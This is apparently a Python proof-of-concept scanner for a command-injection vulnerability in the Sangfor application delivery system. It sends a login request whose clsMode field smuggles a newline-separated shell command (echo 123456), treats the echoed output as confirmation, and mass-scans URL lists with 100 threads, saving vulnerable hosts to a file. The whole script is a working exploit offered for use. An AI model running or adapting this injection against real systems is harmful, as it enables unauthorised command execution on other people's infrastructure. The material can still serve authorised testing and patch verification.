#深信服应用交付系统命令执行漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """███████╗███████╗███████╗    ██████╗  ██████╗███████╗
██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
███████╗███████╗█████╗█████╗██████╔╝██║     █████╗  
╚════██║╚════██║██╔══╝╚════╝██╔══██╗██║     ██╔══╝  
███████║███████║██║         ██║  ██║╚██████╗███████╗
╚══════╝╚══════╝╚═╝         ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                    

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='深信服应用交付系统命令执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/rep/login'
    headers = {
        'Cookie':'UEDC_LOGIN_POLICY_VALUE=checked',
        'Content-Length':'124',
        'Sec-Ch-Ua':'"Not/A)Brand";v="99","GoogleChrome";v="115","Chromium";v="115"',
        'Accept':'*/*',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile':'?0',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Sec-Fetch-Site':'same-origin',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Dest':'empty',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
    }
    data = 'clsMode=cls_mode_login%0Aecho%20123456%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10,proxies=proxies)
        if res1.status_code == 200 and '123456' in res1.text:
            print(f"[+]{target}漏洞存在")
            with open('result4.txt','a',encoding='utf-8') as fp:
                fp.write(f'{target}'+'\n')
        else:
            print(f"[-]{target}漏洞不存在")
    except:
        print(f"[-]{target}该站点存在问题")

if __name__ == '__main__':
    main()